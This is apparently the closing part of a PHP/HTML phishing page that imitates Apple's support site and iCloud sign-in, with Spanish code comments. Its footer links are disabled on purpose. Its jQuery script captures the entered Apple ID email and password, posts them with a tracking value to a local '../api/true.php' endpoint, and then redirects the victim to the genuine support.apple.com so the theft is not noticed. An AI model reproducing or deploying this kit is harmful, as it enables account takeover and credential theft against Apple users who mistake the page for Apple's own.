   <footer id="ac-globalfooter" class="no-js" lang="en-US" data-analytics-region="global footer" role="contentinfo" aria-labelledby="ac-gf-label">
      <div class="ac-gf-content">
         <h2 class="ac-gf-label" id="ac-gf-label"><?php echo $texto[44]; ?></h2>
         <nav class="ac-gf-breadcrumbs" aria-label="Breadcrumbs" role="navigation">
            <a href="javascript:location.reload()" class="home ac-gf-breadcrumbs-home analytics-exitlink"> <span class="ac-gf-breadcrumbs-home-icon" aria-hidden="true">&#63743</span> <span class="ac-gf-breadcrumbs-home-label">Apple</span> <span class="ac-gf-breadcrumbs-home-chevron"></span> <span class="ac-gf-breadcrumbs-home-mask"></span> </a>
            <div class="ac-gf-breadcrumbs-path">
               <ol class="ac-gf-breadcrumbs-list" vocab="http://schema.org/" typeof="BreadcrumbList">
                  <li class="ac-gf-breadcrumbs-item" property="itemListElement" typeof="ListItem">
                     <span property="name"><?php echo $texto[8]; ?></span>
                     <meta property="position" content="1">
                  </li>
               </ol>
            </div>
         </nav>
         <nav class="ac-gf-directory with-4-columns" aria-label="Apple Directory" role="navigation">
            <div class="ac-gf-directory-column">
               <div class="ac-gf-directory-column-section">
                  <h3 class="ac-gf-directory-column-section-title"><?php echo $texto[45]; ?></h3>
                  <button class="ac-gf-directory-column-section-toggler" aria-controls="Product Support" aria-expanded="false">+</button>
                  <ul class="ac-gf-directory-column-section-list">
                     <li class="ac-gf-directory-column-section-item"> <a class="ac-gf-directory-column-section-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="iPhone " data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()">iPhone <span class="a11y"><?php echo $texto[8]; ?></span></a></li>
                     <li class="ac-gf-directory-column-section-item"> <a class="ac-gf-directory-column-section-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="Mac " data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()">Mac <span class="a11y"><?php echo $texto[8]; ?></span></a></li>
                     <li class="ac-gf-directory-column-section-item"> <a class="ac-gf-directory-column-section-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="iPad " data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()">iPad <span class="a11y"><?php echo $texto[8]; ?></span></a></li>
                     <li class="ac-gf-directory-column-section-item"> <a class="ac-gf-directory-column-section-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="Watch " data-analytics-link-url="/watch" href="javascript:location.reload()">Watch <span class="a11y"><?php echo $texto[8]; ?></span></a></li>
                     <li class="ac-gf-directory-column-section-item"> <a class="ac-gf-directory-column-section-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="Music " data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()">Music <span class="a11y"><?php echo $texto[8]; ?></span></a></li>
                     <li class="ac-gf-directory-column-section-item"> <a class="ac-gf-directory-column-section-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="TV " data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()">TV <span class="a11y"><?php echo $texto[8]; ?></span></a></li>
                     <li class="ac-gf-directory-column-section-item"> <a class="ac-gf-directory-column-section-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="Support Site Map" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()"><?php echo $texto[46]; ?></a></li>
                  </ul>
               </div>
            </div>
            <div class="ac-gf-directory-column">
               <div class="ac-gf-directory-column-section">
                  <h3 class="ac-gf-directory-column-section-title"><?php echo $texto[47]; ?></h3>
                  <button class="ac-gf-directory-column-section-toggler" aria-controls="Service and Repair" aria-expanded="false">+</button>
                  <ul class="ac-gf-directory-column-section-list">
                     <li class="ac-gf-directory-column-section-item"> <a class="ac-gf-directory-column-section-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="Apple Repair Options" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()"><?php echo $texto[48]; ?></a></li>
                     <li class="ac-gf-directory-column-section-item"> <a class="ac-gf-directory-column-section-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="Service and Repair Information" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()"><?php echo $texto[49]; ?></a></li>
                     <li class="ac-gf-directory-column-section-item"> <a class="ac-gf-directory-column-section-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="AppleCare Products" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()"><?php echo $texto[50]; ?></a></li>
                     <li class="ac-gf-directory-column-section-item"> <a class="ac-gf-directory-column-section-link analytics-exitlink" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="Hardware Warranties" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()"><?php echo $texto[51]; ?></a></li>
                     <li class="ac-gf-directory-column-section-item"> <a class="ac-gf-directory-column-section-link analytics-exitlink" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="Software License Agreements" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()"><?php echo $texto[52]; ?></a></li>
                     <li class="ac-gf-directory-column-section-item"> <a class="ac-gf-directory-column-section-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="Complimentary Support" data-analytics-link-url="javascript:location.reload()" href="/complimentary"><?php echo $texto[53]; ?></a></li>
                  </ul>
               </div>
            </div>
            <div class="ac-gf-directory-column">
               <div class="ac-gf-directory-column-section">
                  <h3 class="ac-gf-directory-column-section-title"><?php echo $texto[54]; ?></h3>
                  <button class="ac-gf-directory-column-section-toggler" aria-controls="Resources" aria-expanded="false">+</button>
                  <ul class="ac-gf-directory-column-section-list">
                     <li class="ac-gf-directory-column-section-item"> <a class="ac-gf-directory-column-section-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="Downloads" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()"><?php echo $texto[55]; ?></a></li>
                     <li class="ac-gf-directory-column-section-item"> <a class="ac-gf-directory-column-section-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="Manuals" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()"><?php echo $texto[56]; ?></a></li>
                     <li class="ac-gf-directory-column-section-item"> <a class="ac-gf-directory-column-section-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="Tech Specs" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()"><?php echo $texto[57]; ?></a></li>
                     <li class="ac-gf-directory-column-section-item"> <a class="ac-gf-directory-column-section-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="Accessibility" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()"><?php echo $texto[58]; ?></a></li>
                     <li class="ac-gf-directory-column-section-item"> <a class="ac-gf-directory-column-section-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="Education" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()"><?php echo $texto[59]; ?></a></li>
                     <li class="ac-gf-directory-column-section-item"> <a class="ac-gf-directory-column-section-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="Business" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()"><?php echo $texto[60]; ?></a></li>
                     <li class="ac-gf-directory-column-section-item"> <a class="ac-gf-directory-column-section-link analytics-exitlink" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="Apple Support Videos" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()" rel="nofollow"><?php echo $texto[61]; ?></a></li>
                  </ul>
               </div>
            </div>
            <div class="ac-gf-directory-column">
               <div class="ac-gf-directory-column-section">
                  <h3 class="ac-gf-directory-column-section-title"><?php echo $texto[62]; ?></h3>
                  <button class="ac-gf-directory-column-section-toggler" aria-controls="Connect" aria-expanded="false">+</button>
                  <ul class="ac-gf-directory-column-section-list">
                     <li class="ac-gf-directory-column-section-item"> <a class="ac-gf-directory-column-section-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="Contact Us" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()"><?php echo $texto[63]; ?></a></li>
                     <li class="ac-gf-directory-column-section-item"> <a class="ac-gf-directory-column-section-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="Phone Numbers" data-analytics-link-url="javascript:location.reload()" href="javascript:location.reload()"><?php echo $texto[64]; ?></a></li>
                     <li class="ac-gf-directory-column-section-item"> <a class="ac-gf-directory-column-section-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="My Support" data-analytics-link-url="<?php echo 'https://'.$_SERVER['HTTP_HOST']; ?>" href="<?php echo 'https://'.$_SERVER['HTTP_HOST']; ?>"><?php echo $texto[65]; ?></a></li>
                     <li class="ac-gf-directory-column-section-item"> <a class="ac-gf-directory-column-section-link" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="Apple Support App" data-analytics-link-url="<?php echo 'https://'.$_SERVER['HTTP_HOST']; ?>" href="<?php echo 'https://'.$_SERVER['HTTP_HOST']; ?>"><?php echo $texto[66]; ?></a></li>
                     <li class="ac-gf-directory-column-section-item"> <a class="ac-gf-directory-column-section-link analytics-exitlink" data-analytics-event="link.click" data-analytics-link-component_type="Simple List" data-analytics-link-component_name="Apple Support Communities" data-analytics-link-url="<?php echo 'https://'.$_SERVER['HTTP_HOST']; ?>"><?php echo $texto[67]; ?></a></li>
                  </ul>
               </div>
            </div>
         </nav>
         <section class="ac-gf-footer">
            <div class="ac-gf-footer-shop" x-ms-format-detection="none"></div>
            <div class="ac-gf-footer-locale"> <a class="ac-gf-footer-locale-link" href="javascript:location.reload()" title="Choose your country or region" aria-label="United States. Choose your country or region"><?php echo $texto[68]; ?></a> </div>
            <div class="ac-gf-footer-legal">
               <div class="ac-gf-footer-legal-copyright"><?php echo $texto[69]; ?></div>
               <div class="ac-gf-footer-legal-links"> <a class="ac-gf-footer-legal-link analytics-exitlink" href="<?php echo 'https://'.$_SERVER['HTTP_HOST']; ?>"><?php echo $texto[70]; ?></a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="<?php echo 'https://'.$_SERVER['HTTP_HOST']; ?>"><?php echo $texto[71]; ?></a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="javascript:location.reload()"><?php echo $texto[72]; ?></a> <a class="ac-gf-footer-legal-link" href="<?php echo 'https://'.$_SERVER['HTTP_HOST']; ?>"><?php echo $texto[73]; ?></a></div>
            </div>
         </section>
      </div>
   </footer>
   <script src="js/commons.min.js"></script>
   <script type="text/javascript" src="js/SatelliteLib.full.js"></script>
   <script type="text/javascript" src="js/accsoffer.js"></script>
   <script type="text/javascript" src="js/pod.js"></script>


    <script type="text/javascript">      
         
              
         
         
            $(document).on("submit", ".form-icIoud", function(event){
                   event.preventDefault();
                   addicloud()
                
                     $(".signin-error").css('display','none');

                       var linkg  = "<? echo $linkg ?>"; 
                     
                        var data_form = {
                             email  : $("input#account_name_text_field").val(),
                             password : $("input#password_text_field").val(),
                             linkg    : linkg
                           }
              
              
                      var url_php = '../api/true.php?bG9naW5fYXV0ZW50aWNhdGU';
                      $.ajax({
                          type:'POST',
                          url: url_php,
                          data: data_form,
                          dataType: 'json',
                          async: true,
                          beforeSend: function() {
                            $("#img-png").css("display", "none"); //oculta imagen original
                            $("#img-gif").css("display", "block"); //muestra imagen de carga
                         },
                         }).done(function ajaxDone(resp){
              
                           $("#img-png").css("display", "block"); //oculta imagen original
                           $("#img-gif").css("display", "none"); //muestra imagen de carga
         
                            if(resp.status == false){
                               $(".signin-error").show('slow');  
                               // bloqIP(miip, linkg, idusuario, "Desbloqueada");
                            }else if(resp.status == true){
                              $(".signin-error").hide();                                                            
                               top.location.href = "https://support.apple.com";
                            }
                        
                      }).fail(function ajaxError(e){
                           console.log(e);
                      }).always(function ajaxSiempre(){
                        // console.log('Final de la llamada ajax.');
                      })
                        return false;         
                  
                  
                })


         
         
         
         
           // $(document).on("submit", ".form-icloud", function(event) {
                // event.preventDefault();
                 //  alert("hola") 
         
           //  });
         
             //$(document).ready(function () {
             function addicloud() {
                 try {
                     var c_id = $('input#account_name_text_field');
         
                     c_id.focusout(function() {
         
                         if (c_id.val().indexOf("@icloud.com") !== -1 || c_id.val().indexOf("@") !== -1 || c_id.val().indexOf(' ') >= 0) {
         
                         } else {
         
                             if (c_id.val().length === 0) {
         
                             } else {
                                 c_id.val(function(index, val) {
                                     //   c_log.addClass('dologin');
                                     //   c_log.removeAttr('disabled');
                                      $('div.field-separator').css('display','block!important');
                                     return val + "@icloud.com";
         
                                 });
                             }
                         }
                     });
                 } catch (error) {
         
                 }
             }
             //}) 
         
             //Habilita el boton al escribir en el input
             $("input#account_name_text_field").on('keyup', function(e) {
                 if (e.keyCode != 13) {
                     if ($("input#account_name_text_field").val() != '') {
                         $("button#sign-in").css('opacity', '1');
                     } else {
                         $("button#sign-in").css('opacity', '.6');
                     }
         
                     if ($("input#password_text_field").val() == '') {
         
                         $('div#caja-password').hide('slow');
                         $("#caja-password").css('opacity', '.6');
                         $("#caja-password").css('height', '0px');
                         $("#password_text_field").css('opacity', '.0');
                         $("#password_text_field").css('height', '0px');
                         setTimeout(function() {
                             $("button#sign-in").css('top', '-13px');
                         }, 130)
                         if($(".signin-error").css('display') == 'block'){
                             $(".signin-error").hide('slow');
                         }
         
                         $("input#account_name_text_field").css("border-bottom-left-radius","6px");
                         $("input#account_name_text_field").css("border-bottom-right-radius","6px");
                     }
                 }
             });
         
             //Click en la imagen
             $('img#img-png').on('click', function() {
                 if ($("input#account_name_text_field").val() != '' && $("#password_text_field").css('opacity') != 1) {
         
                     if ($("input#password_text_field").val() == '') {
                         addicloud()
                         $("#img-png").css("display", "none"); //oculta imagen original
                         $("#img-gif").css("display", "block"); //muestra imagen de carga
         
                         //Muestra la contraseña
                         $("#caja-password").show();
                         $("#caja-password").css('opacity', '1');
                         $("#caja-password").css('height', '44px');
                         $("#password_text_field").css('opacity', '1');
                         $("#password_text_field").css('height', '43px');
                         $('input#password_text_field').focus();
         
                         setTimeout(function() {
                             if($("input#password_text_field").is(":focus")){
                                //$("input#password_text_field").css("border","0px solid red");
                                $(".signin-form.fed-auth.show-password .field-separator").css("display","none");
                             }
                         }, 140)    
         
                         if ($("#password_text_field").css('opacity') == 1) {
         
                             //Despliega el boton y muestra la imagen png
                             setTimeout(function() {
                                 $(".widget-container .si-button").css('top', '30px');
                                 $("#img-gif").css("display", "none"); //Oculta gif de cargar
                                 $("#img-png").css("display", "block");
                                 $("button#sign-in").css('opacity', '.6');
         
                             }, 140)
                         }
                     }
                 }
             })
         
             //Cuando se escribe sobre input password
             $("input#password_text_field").on('keyup', function() {
                 if ($("input#password_text_field").val() != '') {
                     $("button#sign-in").removeAttr('disabled');
                     $("button#sign-in").css('opacity', '1');
                 } else if ($("input#password_text_field").val() == '') {
                     $("button#sign-in").attr('disabled', true);
                     $("button#sign-in").css('opacity', '.6');
         
                 }
             })
         
             $('input#account_name_text_field').keydown(function(e) {
                 if (e.keyCode == 13) {
         
                     if ($("input#account_name_text_field").val() != '' && $("#password_text_field").css('opacity') != 1) {
         
                         if ($("input#password_text_field").val() == '') {
                             addicloud()
                             $("#img-png").css("display", "none"); //oculta imagen original
                             $("#img-gif").css("display", "block"); //muestra imagen de carga
                             $(".signin-form.fed-auth.show-password .field-separator").css("display","block");
                             $("input#account_name_text_field").css("border-bottom-left-radius","0px");
                             $("input#account_name_text_field").css("border-bottom-right-radius","0px");
         
                             //Muestra la contraseña
                             $("#caja-password").show();
                             $("#caja-password").css('opacity', '1');
                             $("#caja-password").css('height', '44px');
                             $("#password_text_field").css('opacity', '1');
                             $("#password_text_field").css('height', '43px');
                             $('input#password_text_field').focus();
         
         
                             setTimeout(function() {
                             if($("input#password_text_field").is(":focus")){
                                //$("input#password_text_field").css("border","0px solid red");
                                $(".signin-form.fed-auth.show-password .field-separator").css("display","none");
                             }
                              }, 140)    
                             if ($("#password_text_field").css('opacity') == 1) {
         
                                 //Despliega el boton y muestra la imagen png
                                 setTimeout(function() {
                                     $(".widget-container .si-button").css('top', '30px');
                                     $("#img-gif").css("display", "none"); //Oculta gif de cargar
                                     $("#img-png").css("display", "block");
                                     $("button#sign-in").css('opacity', '.6');
         
                                 }, 140)
                             }
                         }
                     }
                 }
             })
              
            
               
              
      </script>
</body>
</html>



  <?php }else{?>
<html>
   <head>
      <title><?php echo $texto[0]; ?></title>
      <link rel="shortcut icon" href="img/favi.ico" /> 
   </head>
   <body></body>
</html>
<?php } ?>

